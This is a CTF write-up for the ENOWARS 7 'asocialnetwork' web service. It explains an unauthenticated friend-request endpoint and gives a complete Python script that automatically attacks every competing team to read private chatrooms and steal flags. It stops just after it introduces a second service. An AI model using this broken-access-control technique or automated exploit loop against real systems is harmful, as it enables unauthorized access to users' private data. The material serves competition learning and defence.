*2023-07-22*

#ctf-writeup 

> [!Abstract] Introduction
> ENOWARS 7 was an Attack/Defence CTF hosted in the summer of 2023. During the competition, teams are given a Linux-based vulnbox the runs a number of vulnerable services. 
> 
> The objective of the game is to find and patch vulnerabilities on your own machine while simultaneously exploiting those same vulnerabilities against everyone else. This leads to a fast-paced compeition that tests lots of different skills. 
> 
> This year's ENOWARS was very well put together, and my team and I had a lot of fun competing.
> 
> https://ctftime.org/event/2040


# asocialnetwork
**Category: Web**

For this service we were given a node.js application running through a Docker container. Only a single port, `3000`, was exposed. When navigating to the service in a web browser you are taken to a mock social media platform, complete with friend requests and a fully-functional chatroom. 

The page is also quite stylish!

![[../Files/Pasted image 20230722220044.png]]

During an attack/defence CTF, flags are updated once per "tick", or in other words the flags change once a minute. After each tick, information about where to find the new flags is published. In this case it was a username, indicating that we had to read the flag from some data that was associated a specific user.

One feature of the platform was that you could create private chatrooms only available to you friends. We guessed that the flags would be hidden in one of these chatrooms, and needed to figure out how to get access.

We found that the POST endpoint that is used to accept a friend request does not have any authentication, meaning we can accept a friend request for a user different than our own.

> [!Todo]
> We decided we needed to do the following:
> 1. Create a new user account
> 2. Send a friend request to a user with a flag
> 3. Accept our friend request on behalf of that user
> 4. View the user's private chatrooms and steal the flag

## Creating a user account
Creating the user account was quite simple as it was just a matter of sending the correct POST request to the `/register` endpoint.

The following Python 3 code automated the process:

```python
def create_account(username, endpoint=None):
    data = {
        "username": username,
        "password": username,
        "confirmPassword": username
    }

    print(f"Creating account {username}... ", end="")
    r = s.post(f"{endpoint}/register", data=data, timeout=TIMEOUT)
    print(r.status_code)
```

## Sending a friend request
We automated this step too. After creating a new user we sent a POST request to the `/friends/requests` endpoint which created a new friend request.

```python
def add_friend(from_u, to_u, endpoint=None):
    data = {
        "partner": to_u,
        "userName": from_u,
        "status": "send",
    }

    print(f"Adding friend {to_u}... ", end="")
    r = s.post(f"{endpoint}/friends/requests", data=data, timeout=TIMEOUT)
    print(r.status_code)
```

## Accepting the friend request
This is where the magic happens! Because there is no authentication when accepting friend requests, we can send a POST request to the `/friends/requests` endpoint asking it to accept. This will add as a friend to the user with the flag without their consent.

```python
def accept_request(from_u, to_u, endpoint=None):
    data = {
        "partner": to_u,
        "userName": from_u,
        "status": "accept",
    }

    print("Accepting request... ", end="")
    r = s.post(f"{endpoint}/friends/requests", data=data, timeout=TIMEOUT)
    print(r.status_code)
```

## Viewing the private chatrooms
Now that we are friends with the user we are able to see their private chatrooms. Finding the link to the chatroom is slightly more complicated.

First we performed a GET request to the `/profile` endpoint. This let us view the private profile page of the user and listed the names of their chatrooms. The BeautifulSoup library was used to help with HTML parsing.

```python
def get_rooms(friend, endpoint=None):
    print("Getting rooms...", end="")
    r = s.get(f"{endpoint}/profile/{friend}", timeout=TIMEOUT)
    print(r.status_code)

    parsed_html = BeautifulSoup(r.text, "html.parser")
    rooms = parsed_html.find_all("div", {"class": "room"})

    room_list = []
    for room in rooms:
        room_name = room.find("h3").text
        room_list.append(room_name)

    return room_list
```

After finding the room names we needed to get the ID to the chatroom itself so that we can include it in the URI. Reading through the source code, we found that the ID is generated using the SHA-256 hash of the room's name.

```node
// chatroomRouter.js

router.post('/', async (req, res) => {
    try {
        let chatroom = await Chatroom.findOne({ id: crypto.createHash('sha256').update(req.body.roomname).digest('hex') }).lean()
        if (typeof req.body.roomname !== 'string') {
            res.status(400).send('Room Name must be a string')
            return
        }

...
```

Since we know the room's name already, we can generate the ID again ourselves by re-generating the hash.

```python
room_id = sha256(room.encode("utf-8")).hexdigest()
```

Finally, we can hit the `/chatroom` endpoint and get the flag!

```python
def get_flag(room_name, endpoint=None):
    print("Getting flags from chatroom...", end="")
    r = s.get(f"{endpoint}/chatroom/{room_name}", timeout=TIMEOUT)
    print(r.status_code)

    parsed_html = BeautifulSoup(r.text, "html.parser")
    messages = parsed_html.find_all("p")

    flags = []
    for message in messages:
        flag = message.text

        if "ENO" in flag:
            flags.append(flag)

    return flags
```

> [!Success]
> The flags were in fact in the private chatroom of the user! Once we had a proof of concept we were able to put all of the automation steps together and attack other teams who had not yet patched the vulnerability!

The following script was used to continually attack other teams and extract flags:

```python
import requests
import uuid
from hashlib import sha256
import json

from pushflag import submit_flag
from bs4 import BeautifulSoup

s = None

TIMEOUT = 4

BLACKLIST = []

def create_account(username, endpoint=None):
    data = {
        "username": username,
        "password": username,
        "confirmPassword": username
    }

    print(f"Creating account {username}... ", end="")
    r = s.post(f"{endpoint}/register", data=data, timeout=TIMEOUT)
    print(r.status_code)

def add_friend(from_u, to_u, endpoint=None):
    data = {
        "partner": to_u,
        "userName": from_u,
        "status": "send",
    }

    print(f"Adding friend {to_u}... ", end="")
    r = s.post(f"{endpoint}/friends/requests", data=data, timeout=TIMEOUT)
    print(r.status_code)

def accept_request(from_u, to_u, endpoint=None):
    data = {
        "partner": to_u,
        "userName": from_u,
        "status": "accept",
    }

    print("Accepting request... ", end="")
    r = s.post(f"{endpoint}/friends/requests", data=data, timeout=TIMEOUT)
    print(r.status_code)

def get_rooms(friend, endpoint=None):
    print("Getting rooms...", end="")
    r = s.get(f"{endpoint}/profile/{friend}", timeout=TIMEOUT)
    print(r.status_code)

    parsed_html = BeautifulSoup(r.text, "html.parser")
    rooms = parsed_html.find_all("div", {"class": "room"})

    room_list = []
    for room in rooms:
        room_name = room.find("h3").text

        room_list.append(room_name)

    return room_list

def get_flag(room_name, endpoint=None):
    print("Getting flags from chatroom...", end="")
    r = s.get(f"{endpoint}/chatroom/{room_name}", timeout=TIMEOUT)
    print(r.status_code)

    parsed_html = BeautifulSoup(r.text, "html.parser")
    messages = parsed_html.find_all("p")

    flags = []
    for message in messages:
        flag = message.text

        if "ENO" in flag:
            flags.append(flag)

    return flags

def pwn(ip, friend):
    global s

    endpoint = f"http://{ip}:3000"

    s = requests.Session()

    username = uuid.uuid4()

    create_account(username, endpoint=endpoint)

    add_friend(username, friend, endpoint=endpoint)
    accept_request(username, friend, endpoint=endpoint)

    rooms = get_rooms(friend, endpoint=endpoint)

    all_flags = []
    for room in rooms:
        room_hash = sha256(room.encode("utf-8")).hexdigest()
        flags = get_flag(room_hash, endpoint=endpoint)

        all_flags += flags

    for flag in all_flags:
        print(f"Flag: {flag}")
        response = submit_flag(f"{flag}", "10.0.13.37", 1337)
        print(f"Flag submitted: {response}")


    if len(all_flags) == 0:
        print("No flags!")


def get_all_teams():
    j = requests.get("https://7.enowars.com/scoreboard/attack.json", timeout=TIMEOUT).json()

    return j

def main():
    while True:
        try:
            team_data = get_all_teams()

            for team in team_data["availableTeams"]:
                try:
                    if team in BLACKLIST:
                        continue

                    print(f"Pwning {team}")
                    data = team_data["services"]["asocialnetwork"][team]
                    latest_tick = sorted(list(data.keys()))[-1]
                    friend_1 = json.loads(data[latest_tick]["1"][0])["username"]

                    pwn(team, friend_1)

                except Exception as e:
                    print(e)

                print("=" * 64)
                print()

        except Exception as e:
            print(e)

if __name__ == "__main__":
    main()
```

# oldschool
**Category: Web**

This service was another web service running under Docker. It was written in PHP, a language I am less confident with, and was running on the port `9080`.
